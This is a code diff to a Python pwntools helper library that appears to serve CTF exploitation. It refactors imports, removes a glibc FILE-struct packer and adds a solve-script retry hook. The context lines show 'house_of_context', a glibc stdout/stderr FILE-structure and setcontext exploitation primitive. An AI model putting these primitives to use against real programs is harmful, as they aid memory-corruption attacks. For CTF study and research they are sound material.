@@ -1,4 +1,8 @@
-from pwn import *
+import sys, os, inspect
+from pwnlib.args import args as _args
+from pwnlib.context import context as _context
+from pwnlib.rop.srop import SigreturnFrame
+from pwnlib.util.packing import p64, p32, p16, flat
 from .io_file import IO_FILE_plus_struct
 
 def proc_maps_parser(data):
@@ -95,7 +99,7 @@ def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
 #      (because when it is, attack stdout instead)
 # for stdout, we corrupt stdin/stderr/stdout pointers, which we fix by spraying &stdout 
 def house_of_context(libc,file='stdout',**kwargs) -> (int, bytes):
-    assert context.bits == 64, "only support amd64!"
+    assert _context.bits == 64, "only support amd64!"
     assert file in ['stdout', 'stderr'], "only support stdout/stderr"
 
     # ensure alignment so we can tcache poison
@@ -140,48 +144,6 @@ def house_of_context(libc,file='stdout',**kwargs) -> (int, bytes):
         p64(0)*2, # to satisfy hoa3 constraints (__cd_in.step.__shlib_handle == NULL)
         bytes(frame) # setcontext payload
     )
-
-def pack_file(_flags = 0,
-              _IO_read_ptr = 0,
-              _IO_read_end = 0,
-              _IO_read_base = 0,
-              _IO_write_base = 0,
-              _IO_write_ptr = 0,
-              _IO_write_end = 0,
-              _IO_buf_base = 0,
-              _IO_buf_end = 0,
-              _IO_save_base = 0,
-              _IO_backup_base = 0,
-              _IO_save_end = 0,
-              _IO_marker = 0,
-              _IO_chain = 0,
-              _fileno = 0,
-              _lock = 0,
-              _wide_data = 0,
-              _mode = 0):
-    file_struct = p64(_flags) + \
-             p64(_IO_read_ptr) + \
-             p64(_IO_read_end) + \
-             p64(_IO_read_base) + \
-             p64(_IO_write_base) + \
-             p64(_IO_write_ptr) + \
-             p64(_IO_write_end) + \
-             p64(_IO_buf_base) + \
-             p64(_IO_buf_end) + \
-             p64(_IO_save_base) + \
-             p64(_IO_backup_base) + \
-             p64(_IO_save_end) + \
-             p64(_IO_marker) + \
-             p64(_IO_chain) + \
-             p32(_fileno)
-    file_struct = file_struct.ljust(0x88, b"\x00")
-    file_struct += p64(_lock)
-    file_struct = file_struct.ljust(0xa0, b"\x00")
-    file_struct += p64(_wide_data)
-    file_struct = file_struct.ljust(0xc0, b'\x00')
-    file_struct += p64(_mode)
-    file_struct = file_struct.ljust(0xd8, b"\x00")
-    return file_struct
 
 def find_libc_leak(memory_dump, target_addr, aligned=False, is_32bit=False):
     """
@@ -266,6 +228,33 @@ def set_alias(p):
 def i2b(n: int):
     return str(n).encode()
 
+def rerun(p):
+    """
+    solve script bruteforcer. add this to your solve script:
+    ```python
+    p = process("./bin")
+    if args.RERUN:
+        sys.excepthook = rerun(p)
+    ```
+    now `python3 solve.py RERUN` will restart your script if it crashes
+    """
+    path = os.path.abspath(inspect.stack()[1].filename)
+
+    def rerun_exploit(exc_type, exc_value, exc_tb):
+        try: p.close()
+        except: pass
+        print("one more roll")
+        rerun_args = [sys.executable, path]
+        rerun_args.extend([f"{k}={v}" for k, v in _args.items() if v])
+        rerun_args.append(f"LOG_LEVEL={_context.log_level}")
+        if os.environ.get("TRIES") is None:
+            os.environ["TRIES"] = "0"
+        else:
+            os.environ["TRIES"] = str(int(os.environ.get("TRIES", 0)) + 1)
+        print(f"tries: {os.environ['TRIES']}")
+        os.execve(sys.executable, rerun_args, os.environ)
+
+    return rerun_exploit
 
 __all__ = [
     "proc_maps_parser",
@@ -282,4 +271,5 @@ __all__ = [
     "find_libc_leak",
     "set_alias",
     "i2b",
+    "rerun",
 ]
